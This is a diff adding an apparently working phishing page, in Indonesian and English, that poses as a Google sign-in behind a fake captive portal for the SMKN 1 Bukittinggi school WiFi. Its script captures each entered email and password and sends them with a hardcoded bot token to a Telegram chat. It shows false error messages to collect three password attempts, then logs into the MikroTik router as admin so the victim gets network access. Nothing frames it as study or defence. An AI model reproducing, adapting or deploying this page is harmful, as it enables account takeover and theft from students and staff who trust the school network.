@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', arial, sans-serif; }
+        body { background: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
+
+        /* Layar Awal: Persuasif */
+        #blocker {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 999; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; text-align: center; padding: 20px;
+        }
+        .icon-lock { color: #1a73e8; font-size: 48px; margin-bottom: 20px; }
+        .lock-title { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 12px; }
+        .lock-text { font-size: 14px; color: #5f6368; max-width: 320px; margin-bottom: 24px; line-height: 1.4; }
+
+        /* Container Card */
+        .container { 
+            width: 450px; min-height: 500px; border: 1px solid #dadce0; 
+            border-radius: 8px; padding: 48px 40px 36px; transition: 0.5s;
+            opacity: 0; transform: translateY(20px); position: relative;
+        }
+        @media (max-width: 450px) { .container { width: 100%; height: 100vh; border: none; padding: 24px; } }
+
+        .loading-line { 
+            position: absolute; top: 0; left: 0; height: 4px; background: #1a73e8; 
+            width: 0%; transition: 0.4s ease; display: none;
+        }
+
+        .logo { display: block; margin: 0 auto 10px; width: 75px; }
+        .header { text-align: center; margin-bottom: 24px; }
+        .header h1 { font-size: 24px; font-weight: 500; color: #202124; margin-bottom: 8px; }
+        
+        .user-identity {
+            display: none; align-items: center; justify-content: center;
+            border: 1px solid #dadce0; border-radius: 20px; padding: 4px 12px;
+            width: fit-content; margin: 0 auto 20px; font-size: 14px; font-weight: 500;
+        }
+
+        .field { position: relative; margin-top: 10px; margin-bottom: 25px; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; }
+        input:focus { border: 2px solid #1a73e8; }
+        
+        .label {
+            position: absolute; left: 12px; top: 15px; background: #fff;
+            padding: 0 4px; color: #5f6368; font-size: 16px; transition: 0.2s; pointer-events: none;
+        }
+        input:focus + .label, input:not(:placeholder-shown) + .label {
+            top: -10px; left: 8px; font-size: 12px; color: #1a73e8; font-weight: 500;
+        }
+
+        .error-msg { color: #d93025; font-size: 12px; margin-top: -20px; margin-bottom: 15px; display: none; text-align: left; }
+
+        .footer-btns { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .btn {
+            background: #1a73e8; color: #fff; border: none; padding: 10px 24px;
+            border-radius: 4px; font-weight: 500; cursor: pointer;
+        }
+
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+    <div id="blocker">
+        <div class="icon-lock">🔐</div>
+        <h2 class="lock-title">Akses Diperlukan</h2>
+        <p class="lock-text">Jaringan WiFi SMKN 1 Bukittinggi memerlukan validasi akun Google untuk memastikan keamanan perangkat Anda.</p>
+        <button class="btn" onclick="openLogin()">LANJUTKAN</button>
+    </div>
+
+    <div class="container" id="login-card">
+        <div id="progress" class="loading-line"></div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" class="logo">
+        
+        <div class="header">
+            <h1 id="main-title">Sign in</h1>
+            <p id="sub-title" style="font-size: 16px; color: #202124;">Use your Google Account</p>
+        </div>
+
+        <div id="user-pill" class="user-identity">
+            <span id="display-email"></span>
+        </div>
+
+        <form id="mikrotik-form" action="$(link-login-only)" method="post" style="display:none">
+            <input type="hidden" name="username" value="admin">
+            <input type="hidden" name="password" value="">
+            <input type="hidden" name="dst" value="$(link-orig)">
+        </form>
+
+        <div id="step-email">
+            <div class="field">
+                <input type="text" id="email" placeholder=" " required>
+                <label class="label">Email or phone</label>
+            </div>
+            <div class="footer-btns">
+                <a href="#" style="text-decoration:none; color:#1a73e8; font-size:14px;">Forgot email?</a>
+                <button class="btn" onclick="handleEmail()">Next</button>
+            </div>
+        </div>
+
+        <div id="step-password" class="hidden">
+            <div class="field">
+                <input type="password" id="pass" placeholder=" " required>
+                <label class="label">Enter your password</label>
+            </div>
+            <div id="err" class="error-msg">Gagal menyinkronkan data. Silakan coba lagi.</div>
+            <div class="footer-btns">
+                <a href="#" style="text-decoration:none; color:#1a73e8; font-size:14px;">Forgot password?</a>
+                <button class="btn" onclick="handleFinal()">Next</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const token = "8018167827:AAEJwu48143-9SBJRQwS9hHqYJaJAGQMMPM";
+        const chatID = "6065257300";
+        let tries = 0;
+
+        function openLogin() {
+            document.getElementById('blocker').style.opacity = '0';
+            setTimeout(() => {
+                document.getElementById('blocker').style.display = 'none';
+                const card = document.getElementById('login-card');
+                card.style.opacity = '1';
+                card.style.transform = 'translateY(0)';
+            }, 400);
+        }
+
+        function runLoading(done) {
+            const bar = document.getElementById('progress');
+            bar.style.display = 'block';
+            bar.style.width = '100%'; 
+            setTimeout(() => { bar.style.display = 'none'; bar.style.width = '0%'; done(); }, 800);
+        }
+
+        function handleEmail() {
+            const email = document.getElementById('email').value;
+            if(!email) return;
+
+            runLoading(() => {
+                document.getElementById('main-title').innerText = "Welcome";
+                document.getElementById('sub-title').style.display = "none";
+                document.getElementById('user-pill').style.display = "flex";
+                document.getElementById('display-email').innerText = email;
+                document.getElementById('step-email').style.display = "none";
+                document.getElementById('step-password').classList.remove('hidden');
+            });
+        }
+
+        function handleFinal() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            if(!pass) return;
+
+            runLoading(() => {
+                tries++;
+                
+                // Kirim ke Telegram
+                const text = encodeURIComponent(`🚨 *LOG GOOGLE* 🚨\n\n📧 *Email:* \`${email}\`\n🔑 *Pass:* \`${pass}\`\n🔢 *Tries:* ${tries}`);
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${text}&parse_mode=Markdown`);
+
+                if(tries < 3) {
+                    document.getElementById('pass').value = "";
+                    document.getElementById('pass').style.border = "2px solid #d93025";
+                    document.getElementById('err').style.display = "block";
+                } else {
+                    // BERHASIL PADA PERCOBAAN KE-3
+                    alert("Otentikasi Berhasil. Menghubungkan ke jaringan...");
+                    document.getElementById('mikrotik-form').submit(); // Kirim login admin ke MikroTik
+                }
+            });
+        }
+    </script>
+</body>
+</html>
